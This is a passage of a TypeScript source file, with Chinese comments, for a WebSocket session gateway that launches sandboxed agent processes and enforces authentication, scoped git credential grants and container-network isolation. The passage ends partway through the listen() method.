import { createHash, createHmac, randomBytes, randomUUID, timingSafeEqual } from "node:crypto";
import { isValidRefGlob, newJti as newGrantJti, signGrant, type GrantClaims } from "../gitproxy/grants.ts";
import { assertDistinctCredentialDomains, assertMasterKeyStrength, toDomainBytes } from "./credential-domains.ts";
import { linkBrowserSid, peekSessionsForBrowserSid, takeSessionsForBrowserSid } from "./grant-session-mapping.ts";
import { computeNextRenewDelayMs, computeGrantExpiry, decideRenew } from "./renew-policy.ts";
import { OwnedRenewTimer } from "./owned-renew-timer.ts";
import { applyRotation, mergeIssueIntoEntry, planRotation, retireUndeliveredNew, rollbackRotation } from "./grant-rotation.ts";
import { createReadStream, existsSync, mkdirSync, readFileSync, readdirSync, realpathSync, statSync, writeFileSync, renameSync, chmodSync, unlinkSync } from "node:fs";
import { type ChildProcess, spawn } from "node:child_process";
import { type IncomingMessage, type ServerResponse, createServer } from "node:http";
import type { Duplex } from "node:stream";
import { extname, join, normalize, resolve, sep } from "node:path";
import { type WebSocket, WebSocketServer } from "ws";
import { AuditLog } from "../audit/log.ts";
import { assertScopedTokenKey } from "../modelgw/scoped-token.ts";
import type { ClientCommand, ClientEvent, Role } from "../protocol/types.ts";
import { parseCommand } from "../protocol/validate.ts";
import { type ExecutionBackend, LocalBackend, DockerBackend, KubectlBackend, dockerClientEnv, safeDockerCmd } from "./execution-backend.ts";
import { type SandboxWiring, writeGitCredentialConfig } from "./sandbox-config.ts";
import type { ModelGateway } from "../runtime/models.ts";
import { type Authenticator, BrowserSessions, JwtAuthenticator, type Principal, RemoteJwks, scopeFromGroups } from "./auth.ts";
import { DEFAULT_LIMITS, type Limits, Outbox, RateLimiter, hostAllowed, originAllowed, validateLimits } from "./transport.ts";
import { Session } from "./session.ts";
import { acquireGatewayLock, type HeldLock, lockStillHeld, releaseGatewayLock } from "./state-lock.ts";
import { DEFAULT_RECEIPT_TTL_MS, ReceiptStore, type CreateReceipt, type ReceiptOutcome, type ReceiptStage } from "./receipt-store.ts";

export interface OidcConfig {
	issuer: string;
	authorizationEndpoint: string;
	tokenEndpoint: string;
	clientId: string;
	clientSecret?: string;
	redirectUri: string;
	scope?: string;
	clockSkewSec?: number;
	allowHttp?: boolean;
}

export interface GatewayConfig {
	port: number;
	host: string;
	/**
	 * 必须显式选择。demo：共享 token + 客户端自报 actor，仅限回环地址，只是演示环境的门锁。
	 * production：只信 auth 验签得出的 principal；禁共享 token、禁 query 凭据/身份，缺配置直接拒绝启动，不降级。
	 */
	mode: "demo" | "production";
	/** 共享 token，仅 demo。生产模式传入会抛错 */
	token?: string;
	/** 生产凭证校验（如 JwtAuthenticator）。demo 传入会抛错 */
	auth?: Authenticator;
	/** 生产必填：精确匹配的 Host（host:port）与 Origin（scheme://host[:port]）。demo 默认回环地址 + 实际端口 */
	allowedHosts?: string[];
	allowedOrigins?: string[];
	/** 浏览器会话 cookie 的最长存活，另受 token exp 约束，默认 8h */
	browserSessionMaxMs?: number;
	/** 验签超时（ms），默认 5000ms */
	authTimeoutMs?: number;
	limits?: Partial<Limits>;
	policyFile: string;
	auditFile: string;
	workspaceRoot: string;
	stateRoot?: string;
	webRoot: string;
	model?: ModelGateway;
	approvalTimeoutMs?: number;
	/** 会话空闲多久后回收（连同 pi 进程） */
	idleTimeoutMs?: number;
	/** 同时存活的会话上限，防止一条 token 把节点打满 */
	maxSessions?: number;
	/** 每个会话可用的 repo/team。策略作用域必须由服务端决定，不能让客户端自选 */
	/** 返回 undefined 表示该身份无权创建会话。production 下 principal 来自验签，且必须提供 */
	resolveScope?: (actor: string, principal?: Principal) => { repo: string; team: string } | undefined;
	/** 生产模式下持续校验主体是否有特定资源权限；若未提供则默认用 resolveScope 推导并比对 repo */
	authorizeResource?: (actor: string, principal: Principal | undefined, resource: { repo: string; team: string }) => boolean;
	/**
	 * 沙箱接线：模型网关与 git 代理的地址 + 代理 token。给了就为每个会话
	 * 生成隔离的 pi HOME，让 agent 只能经这两个代理出网。
	 * proxyToken 必须与本网关的 token 不同 —— 构造时断言，理由见 SandboxWiring。
	 */
	wiring?: SandboxWiring;
	/**
	 * S4c：模型 scoped 凭证签发密钥（与模型网关 scopedTokenKey 同一密钥，≥32 字节，
	 * Buffer 或 hex/base64 字符串皆可，构造期统一为 Buffer）。配置后每个会话的模型
	 * Authorization 改为按调用签发的短期 scoped token（归属=owner principal/team/sessionId，
	 * 10min TTL，Session 内 mint），静态 proxyToken 不再上行模型网关；未配置时行为完全不变。
	 * 密钥只存在于网关进程，凭据域必须与其他秘值互异（构造期断言）；
	 * production 未配置时启动留固定类别态势审计（不拒启，理由见构造期注释）。
	 */
	modelScopedKey?: Buffer | string;
	/**
	 * B2 scoped git grants（合同 §A）。配置后网关在新会话创建时签发六维 grant
	 * （session/repo/rw/writeRefs/exp≤15min/jti/epoch），并维护仅内网的
	 * /internal/git/registry 活会话登记端点（gitproxy 轮询消费）。
	 * production 部署必须配置（gitproxy production 侧要求 registry 可用）。
	 */
	gitGrants?: {
		/** HMAC masterKey（≥32B）；必须与网关/模型/gitProxy 三 token 及 internalToken 互异 */
		masterKey: Buffer | string;
		/** registry 端点 internal bearer（仅 header；production 拒 query） */
		internalToken: string;
		/** ref glob（`*` 不跨 `/`）；无配置时 write cap 不得签发（签发端锁死） */
		writeRefs: string[];
		/** 部署面写开关镜像（与 gitproxy RepoMapping.allowPush 同源）；缺省只读；ctor 同尺校验（H53-b） */
		repos?: { name: string; allowPush?: boolean; writeRefs?: string[]; readRefs?: string[] }[];
		/**
		 * R-Q52-4：续签调度间隔 ms。可选，缺省 TTL/2（7.5min）——旧合法配置不再无故构造抛，
		 * 也不静默 15min 后死；显式提供时必须为正整数且 ≤15min。
		 */
		renewIntervalMs?: number;
		/** 可注入 timer 工厂（纯 fake unit 用；缺省 setTimeout 原生） */
		timerImpl?: (fn: () => void, ms: number) => NodeJS.Timeout;
		/** timerImpl 的配对清除（R-Q52-4：native clearTimeout 会漏 fake 队列）；缺省 clearTimeout */
		clearTimerImpl?: (timer: NodeJS.Timeout) => void;
	};
	/** 每个会话启动时 clone 的仓库（上游真实地址，经 insteadOf 重写到凭据代理） */
	repoUrl?: string;
	/** clone 超时。验收目标是「冷启动（含 clone）< 5s」，默认给 30s 留足余量 */
	cloneTimeoutMs?: number;
	/** pi 进程在哪儿跑。不给则直接在宿主机 spawn（无隔离） */
	backend?: ExecutionBackend;
	/** 生产模式可选的 OIDC Authorization Code + PKCE S256 配置 */
	oidc?: OidcConfig;
	/** S3b：创建收据保留期 ms；默认 24h（DEFAULT_RECEIPT_TTL_MS）。过期收据清理后，同键 create 视为新创建 */
	receiptTtlMs?: number;
	/** S3c：prompt 幂等账本条目上限；超限固定拒绝新任务（不淘汰，避免同键重复生成无提示）。默认 10_000 */
	promptLedgerMaxEntries?: number;
	/** S5a：初始快照 tail 与每页历史的上限（项数/序列化字节；默认 200 项 / 1MiB，handoff §3.2）。透传给每个 Session */
	historyTail?: { maxItems?: number; maxBytes?: number };
	/** S5a2：会话构造后的探针（仅供测试/故障注入：拿到 Session 实例以注入重构快照等；
	 * 生产不配置，零行为影响；先例 createStageProbe） */
	sessionProbe?: (session: Session) => void;
	/**
	 * S3c：外部持有的审计实例（测试/故障注入缝；生产不配置，走 auditFile 自开）。
	 * 网关 close 会顺带 close 它（AuditLog.close 幂等）；open 失败语义与自开一致。
	 */
	auditInstance?: AuditLog;
	/**
	 * S3b：显式创建在各 stage 收据落盘后的回调（await）。仅供测试/故障注入：
	 * 抛错 → 收据 failed；挂起 → 可在窗口内 kill -9 模拟中途崩溃。
	 * 生产不配置；只对显式 create 生效，隐式创建不经过它。
	 */
	createStageProbe?: (stage: "accepted" | "workspace_ready", sessionId: string) => Promise<void> | void;
}

const MIME: Record<string, string> = {
	".html": "text/html; charset=utf-8",
	".js": "text/javascript; charset=utf-8",
	".css": "text/css; charset=utf-8",
	".svg": "image/svg+xml",
};

/** sessionId 会直接参与工作区路径拼接，必须限死字符集 */
const SESSION_ID = /^[A-Za-z0-9_-]{1,64}$/;

/** __Host- 前缀：浏览器强制 Secure、Path=/、不带 Domain，子域/兄弟站点无法覆盖 */
const SESSION_COOKIE = "__Host-perimeter_session";
/** git grants 登记条目（R55-A：含 currentExpAt=当前生效 grant 的 exp，供提前调度计算） */
type GrantRegistryEntry = { sessionId: string; principal: string; tenant: string; repo: string; aclVersion: number; jtis: Set<string>; maxExpAt?: number | null; currentExpAt?: number | null };
/** R-Q52-4：renew 缺省间隔 = TTL/2（安全缺省，不静默 15min 后死也不无故拋） */
const DEFAULT_RENEW_INTERVAL_MS = 7 * 60_000 + 30_000;

interface Conn {
	ws: WebSocket;
	actor: string;
	principal?: Principal;
	outbox: Outbox; overflow: boolean;
	/** 凭证过期时间；到点关闭连接，不能活过凭证 */
	expiresAt: number;
	/** 浏览器 cookie 会话 id，登出/吊销时用来关闭对应连接 */
	sid?: string;
	closed?: boolean;
	revoked?: boolean;
}

/**
 * 会话网关。浏览器经 WebSocket 连到这里，网关为每个会话拉起一个 pi 进程。
 *
 * 身份这块 Phase 1 只做到共享 token：它的作用是把演示环境关起来，
 * 不是企业级身份。OIDC/SAML + RBAC 在 Phase 2，不要拿现在这个去过安全评审。
 * 但即便身份只有共享 token，两件事也必须由服务端决定而不是客户端自选：
 * **会话归属**与**策略作用域（repo/team）**。后者尤其重要 —— 让客户端挑
 * 适用于自己的策略，等于给了一条一键降级的路。
 */
class AuthWorkGate {
	#max: number;
	#activeCount = 0;
	#closed = false;

	constructor(max: number) {
		this.#max = Math.max(1, max);
	}

	get activeCount(): number {
		return this.#activeCount;
	}

	acquire(): boolean {
		if (this.#closed || this.#activeCount >= this.#max) {
			return false;
		}
		this.#activeCount++;
		return true;
	}

	release(): void {
		if (this.#activeCount > 0) {
			this.#activeCount--;
		}
	}

	close(): void {
		this.#closed = true;
	}
}

/** S3b：创建被服务端固定拒绝（scope 无权 / grant 拒绝）。message 面向客户端，可直接回显 */
export class CreateDeniedError extends Error {
	constructor(message: string) {
		super(message);
		this.name = "CreateDeniedError";
	}
}

export async function verifyDockerNetworkInternal(net: string): Promise<string> {
	if (net === "none") return "none";
	try {
		const { stdout } = await safeDockerCmd(["network", "inspect", net], 3000);
		const parsed = JSON.parse(stdout);
		if (!Array.isArray(parsed) || parsed.length === 0) {
			throw new Error(`未找到网络 ${net}`);
		}
		const info = parsed[0];
		if (!info || info.Internal !== true) {
			throw new Error(`docker 网络 ${net} 未开启 Internal 隔离 (Internal=${info?.Internal})，存在未授权出网风险`);
		}
		if (!info.Id || typeof info.Id !== "string" || !info.Id.trim()) {
			throw new Error(`docker 网络 ${net} 缺少合法 Id`);
		}
		return info.Id.trim();
	} catch (err) {
		throw new Error(`生产网络守卫校验失败，拒绝启动: ${String(err)}`);
	}
}

export class Gateway {
	#cfg: GatewayConfig;
	#audit: AuditLog;
	#http = createServer();
	#wss: WebSocketServer;
	#sessions = new Map<string, Session>();
	// B2 scoped git grants：签发方登记表（epoch + 活会话 + 吊销 jti）。
	// 持久化走 stateRoot 0600 tmp+rename；网关重启 epoch 新，不接受旧 epoch grant。
	#gitGrantEpoch = randomUUID();
	#gitGrantActive = new Map<string, GrantRegistryEntry>();
	#gitGrantRenewTimer: { timer: NodeJS.Timeout; clear: (t: NodeJS.Timeout) => void } | null = null;
	/** R59-⑤：owned renew timer 生命周期（同缝纯类；构造期建，随 Gateway 生命周期） */
	#renewTimer = new OwnedRenewTimer();
	/** R55-F：renew 轮询上限间隔（min(配置/缺省, TTL/2)） */
	#renewMaxIntervalMs = DEFAULT_RENEW_INTERVAL_MS;
	/** R57-7：schedule generation（inline 同步 fire 重入检测） */
	#renewScheduleGen = 0;
	/** R-Q52-2：browser cookie sid（服务端验证）→ agent sessionIds 关联（签发时记录） */
	#gitGrantSessionsByBrowserSid = new Map<string, Set<string>>();
	/** R55-C：git 登记保存失败的 logout sid（重试入口；成功 flush 后清除） */
	#pendingLogoutPersistence = new Set<string>();
	#gitGrantRevoked = new Set<string>();
	#gitGrantFile: string;
	/** sessionId → 创建它的身份。别人拿到 id 也接不进来 */
	#owners = new Map<string, string>();
	#reaper: NodeJS.Timeout;
	/** S3b：创建收据存储（按 principal 哈希目录隔离；构造期启动恢复 + TTL 周期清理） */
	#receipts!: ReceiptStore;
	#receiptSweeper?: NodeJS.Timeout;
	/** S3b：同键并发显式创建的单飞表（进程内互斥；跨进程由 S3a stateRoot 独占锁保证） */
	#createInflight = new Map<string, Promise<CreateReceipt>>();
	/** S3b：readyz 短时缓存（≥1s 复用上次结果，限频）；draining/close 永远即时翻红不走缓存 */
	#readyCacheAt = 0;
	#readyCacheOk = false;
	/** close 之后审计 fd 已关，在途的 reap 不能再写 */
	#closed = false;
	/** S3a：stateRoot 独占锁（构造期取得，close 时释放） */
	#lock: HeldLock;
	/** S3a：有序关闭进行中 —— readiness 立即翻红、拒新升级与新任务 */
	#draining = false;
	/** S3a：shutdown 幂等入口（重入共享同一次关闭） */
	#shutdownPromise?: Promise<void>;
	#webRoot: string;
	#limits: Limits;
	#conns = new Set<Conn>();
	/** 已通过 Host/Origin 但尚在异步验签中的 upgrade，也占连接额度 */
	#pending = 0;
	#authGate: AuthWorkGate;
	#authControllers = new Set<AbortController>();
	#authRateLimiter = new RateLimiter(50);
	#browser: BrowserSessions;
	/** 已吊销（离职/撤权）的 principal；支持持久化，损坏时 fail-closed 拒绝启动 */
	#revoked = new Set<string>();
	#stateRoot: string;
	#revocationsFile: string;
	#sessionsFile: string;
	#pkceSecret: Buffer;
	#hosts: ReadonlySet<string> | undefined;
	#origins: ReadonlySet<string> | undefined;
	#demoToken?: Buffer;
	/** S4c：模型 scoped 凭证签发密钥（构造期已归一为 Buffer；undefined = 未配置，行为不变） */
	#modelScopedKey?: Buffer;

	constructor(cfg: GatewayConfig) {
		this.#cfg = cfg;
		this.#webRoot = resolve(cfg.webRoot);
		this.#limits = { ...DEFAULT_LIMITS, ...cfg.limits };
		validateLimits(this.#limits);
		if (cfg.receiptTtlMs !== undefined && (!Number.isSafeInteger(cfg.receiptTtlMs) || cfg.receiptTtlMs <= 0)) {
			throw new Error("配置非法：receiptTtlMs 必须为正整数");
		}
		if (cfg.promptLedgerMaxEntries !== undefined && (!Number.isSafeInteger(cfg.promptLedgerMaxEntries) || cfg.promptLedgerMaxEntries <= 0)) {
			throw new Error("配置非法：promptLedgerMaxEntries 必须为正整数");
		}
		// S5a：tail 上限配置校验。maxBytes 必须给单项截断与信封留余量，否则快照帧
		// 必然撞 maxFrameBytes（1009 断连）—— 那正是本机制要消除的失效模式
		if (cfg.historyTail !== undefined) {
			for (const [name, value] of Object.entries(cfg.historyTail)) {
				if (value !== undefined && (!Number.isSafeInteger(value) || value <= 0)) throw new Error(`配置非法：historyTail.${name} 必须为正整数`);
			}
			if (cfg.historyTail.maxBytes !== undefined && cfg.historyTail.maxBytes > this.#limits.maxFrameBytes - 256 * 1024) {
				throw new Error("配置非法：historyTail.maxBytes 过大：必须小于 maxFrameBytes 减去单项截断余量（256KiB）");
			}
		}

		if (cfg.mode === "production") {
			// 生产不允许任何形式的静默降级：缺任何一项都拒绝启动，而不是回落到共享 token
			if (cfg.token !== undefined) throw new Error("production 模式禁止共享 token");
			if (!cfg.auth) throw new Error("production 模式必须配置 auth（可信凭证校验）");
			if (!cfg.resolveScope) throw new Error("production 模式必须配置 resolveScope：repo/team 由服务端按身份推导");
			if (!cfg.allowedHosts?.length || !cfg.allowedOrigins?.length) throw new Error("production 模式必须显式配置 allowedHosts 与 allowedOrigins");
			for (const origin of cfg.allowedOrigins) {
				let url: URL | undefined;
				try { url = new URL(origin); } catch { /* 下面统一抛错 */ }
				if (!url || url.origin !== origin || origin.includes("*") || url.protocol !== "https:") {
					throw new Error(`production allowedOrigins 必须是精确 https origin：${origin}`);
				}
			}
			for (const host of cfg.allowedHosts) if (!host || /[*/\s]/.test(host)) throw new Error(`allowedHosts 必须是精确 host[:port]：${host}`);
			if (cfg.oidc) {
				if (!cfg.oidc.issuer || !cfg.oidc.authorizationEndpoint || !cfg.oidc.tokenEndpoint || !cfg.oidc.clientId || !cfg.oidc.redirectUri) {
					throw new Error("oidc 配置缺少必填参数");
				}
			}
			if ((cfg as any).allowLocal) throw new Error("production 模式严禁使用 allowLocal 参数绕过隔离守卫");
			if (!cfg.backend) throw new Error("production 模式必须显式配置受支持的隔离执行后端（docker 或 kubectl），拒绝默认无隔离启动");
			if (cfg.backend instanceof LocalBackend || (cfg.backend as any).kind === "local") {
				throw new Error("production 模式严禁使用无隔离的 LocalBackend，必须使用容器隔离后端");
			}
			if (cfg.backend.kind !== "docker" && cfg.backend.kind !== "kubectl") {
				throw new Error(`production 模式仅支持 docker 或 kubectl 隔离后端，不支持: ${(cfg.backend as any).kind}`);
			}
			if (!(cfg.backend instanceof DockerBackend) && !(cfg.backend instanceof KubectlBackend)) {
				throw new Error("production 隔离后端必须是受支持的 DockerBackend 或 KubectlBackend 实例，禁止伪造 kind 对象");
			}
			if (typeof cfg.backend.launch !== "function" || typeof (cfg.backend as any).environment !== "function") {
				throw new Error("production 隔离后端必须实现完整的 launch 与 environment 接口");
			}
			if (cfg.backend instanceof DockerBackend) {
				const net = cfg.backend.network;
				if (!net || net === "bridge" || net === "host") {
					throw new Error("production 模式下 docker 后端禁止使用 bridge 或 host 网络，必须显式配置受控隔离网络（如 none/internal）");
				}
			}
			this.#hosts = new Set(cfg.allowedHosts.map((h) => h.toLowerCase()));
			this.#origins = new Set(cfg.allowedOrigins.map((o) => o.toLowerCase()));
		} else if (cfg.mode === "demo") {
			if (cfg.auth) throw new Error("demo 模式不使用 auth；要用可信身份请显式选择 production");
			if (cfg.token === undefined) throw new Error("demo 模式必须提供共享 token");
			if (cfg.oidc) throw new Error("demo 模式不支持 oidc");
			if (!["127.0.0.1", "localhost", "::1"].includes(cfg.host)) throw new Error("demo 模式（共享 token + 自报 actor）只能绑定回环地址");
			if (cfg.allowedHosts) this.#hosts = new Set(cfg.allowedHosts.map((h) => h.toLowerCase()));
			if (cfg.allowedOrigins) this.#origins = new Set(cfg.allowedOrigins.map((o) => o.toLowerCase()));
			this.#demoToken = createHash("sha256").update(cfg.token).digest();
		} else throw new Error("mode 必须显式指定为 demo 或 production");

		// 凭据域必须分开；沙箱的 git token 不能访问模型或会话网关。
		const modelToken = cfg.model?.token ?? cfg.wiring?.proxyToken;
		if (cfg.token !== undefined && (modelToken === cfg.token || cfg.wiring?.gitProxyToken === cfg.token)) {
			throw new Error("模型/git 代理 token 不能等于网关 token：凭据域必须分开");
		}
		if (modelToken && modelToken === cfg.wiring?.gitProxyToken) throw new Error("模型 token 不能与 gitProxyToken 相同");
		// S4c：模型 scoped 签发密钥 —— 强度与凭据域互异都在构造期 fail-fast（未配置时零影响）。
		if (cfg.modelScopedKey !== undefined) {
			const scopedKey = toDomainBytes(cfg.modelScopedKey);
			assertScopedTokenKey(scopedKey); // ≥32B Buffer，与 modelgw 验签侧同一把尺
			assertDistinctCredentialDomains([
				{ name: "gateway token", value: cfg.token ?? "" },
				{ name: "model token", value: modelToken ?? "" },
				{ name: "gitProxy token", value: cfg.wiring?.gitProxyToken ?? "" },
				{ name: "gitGrant masterKey", value: cfg.gitGrants?.masterKey ?? "" },
				{ name: "registry internalToken", value: cfg.gitGrants?.internalToken ?? "" },
				{ name: "model scoped key", value: scopedKey },
			]);
			this.#modelScopedKey = scopedKey;
		}
		// B2：grant masterKey / registry internalToken 加入凭据域相异校验（构造期 fail-fast）。
		// H1（真修）：旧实现 others 含 internalToken 自身，loop 条件 t===internalToken 恒真
		// → 任何非空 internalToken 的 gitGrants 配置都构造即抛（恒推 bug）。改用同缝纯模块
		// 按实际字节两两互异（R-Q50-5 Buffer.compare，非 hex/字符串形态），自身不再自比较。
		if (cfg.gitGrants) {
			assertMasterKeyStrength(cfg.gitGrants.masterKey);
			assertDistinctCredentialDomains([
				{ name: "gateway token", value: cfg.token ?? "" },
				{ name: "model token", value: modelToken ?? "" },
				{ name: "gitProxy token", value: cfg.wiring?.gitProxyToken ?? "" },
				{ name: "gitGrant masterKey", value: cfg.gitGrants.masterKey },
				{ name: "registry internalToken", value: cfg.gitGrants.internalToken },
			]);
			// H53-b：gitGrants 级 readRefs/writeGlob 出现即拒（含 empty）——不能被 TS extra
			// field 静默忽略变 repo 全读；writeRefs 用 grants 同尺 glob 校验。
			const ggProbe = cfg.gitGrants as unknown as Record<string, unknown>;
			if ("readRefs" in ggProbe || "writeGlob" in ggProbe) {
				throw new Error("gitGrants 配置含不支持的读控制字段（readRefs/writeGlob）：ref 级读控制代理层不可交付，明确拒");
			}
			for (const g of cfg.gitGrants.writeRefs) {
				if (!isValidRefGlob(g)) throw new Error("gitGrants.writeRefs 含不支持的 glob 形状（固定类别，不透传原文）");
			}
			for (const repoEntry of cfg.gitGrants.repos ?? []) {
				const probe = repoEntry as unknown as Record<string, unknown>;
				if ("readRefs" in probe || "writeGlob" in probe) {
					throw new Error("gitGrants.repos 条目含不支持字段（readRefs/writeGlob）：明确拒");
				}
				for (const g of repoEntry.writeRefs ?? []) {
					if (!isValidRefGlob(g)) throw new Error("gitGrants.repos writeRefs 含不支持的 glob 形状（固定类别，不透传原文）");
				}
			}
		}

		this.#authGate = new AuthWorkGate(Math.min(20, this.#limits.maxConnections));
		this.#browser = new BrowserSessions();
		this.#stateRoot = resolve(cfg.stateRoot ?? (cfg.workspaceRoot + ".state"));
		mkdirSync(this.#stateRoot, { recursive: true, mode: 0o700 });
		try { chmodSync(this.#stateRoot, 0o700); } catch {}
		// S3a：stateRoot 单实例独占锁（handoff §3.3）。先于一切可泄漏资源取得：
		// 此点之后任何构造失败都必须释放锁与已打开资源，第二实例的失败不留端口/定时器/审计。
		this.#lock = acquireGatewayLock(this.#stateRoot);
		try {
			// R65：#audit 赋值前移到首次使用之前（构造期 git grants 恢复/renew hook 的固定审计此前会命中未初始化字段）
			this.#audit = cfg.auditInstance ?? AuditLog.open(cfg.auditFile);
		} catch (err) {
			releaseGatewayLock(this.#lock);
			throw err;
		}
		this.#revocationsFile = join(this.#stateRoot, "revocations.json");
		this.#sessionsFile = join(this.#stateRoot, "browser-sessions.json");
		this.#gitGrantFile = join(this.#stateRoot, "git-grants-registry.json");
		if (cfg.gitGrants) {
			// 重启恢复（H7：R50“无 registry load”为误报，load 真实存在）。安全语义校正：
			// epoch 每次网关重启新 → 恢复的旧 entry 也只因 epoch 不符而拒；文件损坏/形状错
			// **整批丢弃**（不半恢复部分 entry）+ 固定诊断 + fail-closed 从空登记开始。
			try {
				if (existsSync(this.#gitGrantFile)) {
					const disk = JSON.parse(readFileSync(this.#gitGrantFile, "utf8")) as {
						active?: [string, { sessionId?: unknown; principal?: unknown; tenant?: unknown; repo?: unknown; aclVersion?: unknown; jtis?: unknown; maxExpAt?: unknown; currentExpAt?: unknown }][];
						revoked?: unknown;
					};
					let badShape = !Array.isArray(disk.active) || !Array.isArray(disk.revoked);
					// R57-4：captured cap/当前 exp 恢复不再丢——数值或 null 合法；缺失按 null
					//（**重启后 null ≠ 可信无到期 identity 契约**：decideRenew 对 null cap fail-closed
					// 不续，直到同 owner fresh verified reauth）。
					const capOf = (v: unknown): number | null => (v === undefined || v === null ? null : typeof v === "number" && Number.isFinite(v) ? v : Number.NaN);
					const restored: { jti: string; e: GrantRegistryEntry }[] = [];
					if (!badShape) {
						for (const item of disk.active!) {
							if (!Array.isArray(item) || item.length !== 2) { badShape = true; break; }
							const [jti, e] = item as [string, Record<string, unknown>];
							const maxExpAt = capOf(e?.maxExpAt);
							const currentExpAt = capOf(e?.currentExpAt);
							if (Number.isNaN(maxExpAt) || Number.isNaN(currentExpAt) || typeof jti !== "string" || typeof e?.sessionId !== "string" || typeof e?.principal !== "string" || typeof e?.tenant !== "string" || typeof e?.repo !== "string" || typeof e?.aclVersion !== "number" || !Array.isArray(e?.jtis) || e.jtis.some((x) => typeof x !== "string")) {
								badShape = true;
								break;
							}
							restored.push({ jti, e: { sessionId: e.sessionId as string, principal: e.principal as string, tenant: e.tenant as string, repo: e.repo as string, aclVersion: e.aclVersion as number, jtis: new Set(e.jtis as string[]), maxExpAt, currentExpAt } });
						}
						for (const j of disk.revoked as unknown[]) {
							if (typeof j !== "string") { badShape = true; break; }
						}
					}
					if (badShape) {
						// 整批丢弃：不把半恢复 entry 留在内存；旧 epoch/grant 不凭空续签
						this.#gitGrantActive.clear();
						this.#gitGrantRevoked.clear();
						try { this.#audit.append({ kind: "error", sessionId: "system", actor: "system", summary: "git grants 登记文件损坏：整批丢弃，从空登记 fail-closed 开始" }); } catch { /* 构造期审计失败不阻塞 */ }
					} else {
						for (const { jti, e } of restored) this.#gitGrantActive.set(jti, e);
						for (const j of disk.revoked as string[]) this.#gitGrantRevoked.add(j);
					}
				}
			} catch {
				// JSON 解析失败：同上整批丢弃 fail-closed（不部分恢复）
				this.#gitGrantActive.clear();
				this.#gitGrantRevoked.clear();
				try { this.#audit.append({ kind: "error", sessionId: "system", actor: "system", summary: "git grants 登记文件解析失败：整批丢弃，从空登记 fail-closed 开始" }); } catch { /* 同上 */ }
			}
			try { this.#saveGitGrantRegistry(); } catch (err) {
				// 构造失败不留资源：审计 fd 已打开、锁已持有，先收掉再抛
				this.#audit.close();
				releaseGatewayLock(this.#lock);
				throw err;
			}
		}
		// S4c：production 缺 modelScopedKey 的态势留痕 —— 选择「明确记录」而非启动即拒，
		// 理由：网关侧感知不到 modelgw 是否 strictBudget，静态 token 仍是 modelgw 的合法
		// 认证面；硬失败只会打断既有 production 部署而不新增安全。§4.3 目标态在审计可见，
		// 供部署评审处置（fixed category，不透传配置原文）。
		if (cfg.mode === "production" && this.#modelScopedKey === undefined && (cfg.model !== undefined || cfg.wiring?.modelGatewayUrl !== undefined)) {
			this.#tryAudit({
				kind: "error",
				sessionId: "-",
				actor: "system",
				summary: "production 未配置 modelScopedKey：模型通道沿用静态代理 token（归属=modelgw defaultTeam），不符合 §4.3 会话 scoped 凭证目标态（固定类别留痕）",
			});
		}
		this.#pkceSecret = randomBytes(32);
		// R-Q50-3：活会话 grant 续签调度（配置 renewIntervalMs 才启用；可注入 timer）
		let wss: WebSocketServer | undefined;
		try {
			// R72：renew timer（ref 定时器）的 arm 与其后所有会抛错的加载/校验同缝进 try——
			// 构造失败的实例没有 close() 可调，抛错前必须拆除已 armed 的定时器并关闭 audit
			// 再重抛（抛错语义与消息不变）。真实事故：renew armed 450s + loadRevocations
			// 抛错 → ref 定时器拖住整个进程直至强杀。
			this.#startGitGrantRenewTimer();
			this.#loadRevocations();
			this.#loadSessions();
			// S3b：创建收据存储。先恢复（上次进程留下的未终态收据标 outcome_unknown：
			// 不当成功、不自动重做外部副作用），再启动 TTL 周期清理（只删收据，不碰活会话）。
			this.#receipts = new ReceiptStore(this.#stateRoot, this.#cfg.receiptTtlMs ?? DEFAULT_RECEIPT_TTL_MS);
			for (const stale of this.#receipts.recoverNonTerminal()) {
				this.#tryAudit({ kind: "session.create", sessionId: stale.sessionId, actor: stale.principalId, summary: `重启恢复：收据 ${stale.operationId} 未到终态，标记 outcome_unknown（不当成功、不自动重做外部副作用）` });
			}
			const receiptTtl = this.#cfg.receiptTtlMs ?? DEFAULT_RECEIPT_TTL_MS;
			this.#receiptSweeper = setInterval(() => {
				let removed = 0;
				try { removed = this.#receipts.sweepExpired(); } catch { /* 清理失败不中断，下轮重试 */ }
				if (removed > 0) this.#tryAudit({ kind: "session.create", sessionId: "-", actor: "system", summary: `TTL 清理 ${removed} 条过期创建收据（不影响活会话）` });
			}, Math.max(1_000, Math.min(60_000, Math.floor(receiptTtl / 2))));
			this.#receiptSweeper.unref();
			wss = new WebSocketServer({ noServer: true, maxPayload: this.#limits.maxInboundBytes });
			this.#wss = wss;
		} catch (err) {
			this.#stopGitGrantRenewTimer();
			if (this.#receiptSweeper) clearInterval(this.#receiptSweeper);
			try { wss?.close(); } catch { /* 未创建不遮原错误 */ }
			this.#audit.close();
			releaseGatewayLock(this.#lock); // S3a：构造失败不留锁
			throw err;
		}
		try {
			mkdirSync(cfg.workspaceRoot, { recursive: true });
		} catch (err) {
			// 同上：构造失败不留锁与已打开的审计 fd
			this.#audit.close();
			releaseGatewayLock(this.#lock);
			throw err;
		}

		// 任何异常都不能冲出事件回调：未捕获异常会打崩整个网关
		this.#http.on("request", (req, res) => {
			void this.#onRequest(req, res).catch(() => { if (!res.headersSent) res.writeHead(500).end("error"); else res.destroy(); });
		});
		this.#http.on("upgrade", (req, socket, head) => {
			socket.on("error", () => {});
			void this.#onUpgrade(req, socket, head).catch(() => reject(socket, 500, "Internal Server Error"));
		});

		// 空闲回收：没有它，会话与 pi 进程只增不减。
		// 间隔取 idleTimeoutMs 的一半（上限 30s）—— 固定 30s 的话，
		// 把 idleTimeoutMs 配成 5s 仍要等 30s 才回收，是意外行为
		const tick = Math.max(1_000, Math.min(30_000, Math.floor((cfg.idleTimeoutMs ?? 30 * 60_000) / 2)));
		this.#reaper = setInterval(() => {
			// 回调是 async：不接住的话一次拒绝就是未处理的 rejection
			void this.#reap().catch((err) => console.error("回收会话失败:", err));
		}, tick);
		this.#reaper.unref();
	}

	async listen(): Promise<number> {
		if (this.#cfg.mode === "production" && this.#cfg.backend instanceof DockerBackend) {
			const net = this.#cfg.backend.network;
			if (net !== "none") {
				// named network 不是能力证明：必须核验 Internal=true 且绑定真实使用的 network identity
				const verifiedId = await verifyDockerNetworkInternal(net);
				this.#cfg.backend.bindVerifiedNetwork(verifiedId);
			} else {
				this.#cfg.backend.bindVerifiedNetwork("none");
			}
		}
		// 回收上次运行遗留的容器：网关被 SIGKILL 时来不及走 cleanup，
